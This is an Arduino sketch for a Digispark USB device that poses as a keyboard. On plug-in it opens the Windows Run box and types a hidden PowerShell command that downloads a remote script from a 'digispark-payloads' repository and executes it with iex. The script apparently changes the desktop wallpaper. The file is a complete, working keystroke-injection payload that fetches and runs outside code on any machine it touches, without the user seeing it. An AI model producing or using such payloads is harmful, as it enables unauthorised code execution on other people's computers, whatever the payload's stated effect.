// #define LAYOUT_GERMAN
#include "DigiKeyboard.h"

void setup()
{
    pinMode(1, OUTPUT);
    DigiKeyboard.sendKeyStroke(0);

    // open run box
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(250);

    // run command
    DigiKeyboard.println("powershell -W H -c \"irm https://raw.githubusercontent.com/phoenixthrush/digispark-payloads/refs/heads/main/methods/change_wallpaper.ps1 -ImageUrl 'https://www.phoenixthrush.com/assets/images/background.webp' | iex\"");
}

void loop()
{
    digitalWrite(1, HIGH);
    delay(500);
    digitalWrite(1, LOW);
    delay(500);
}
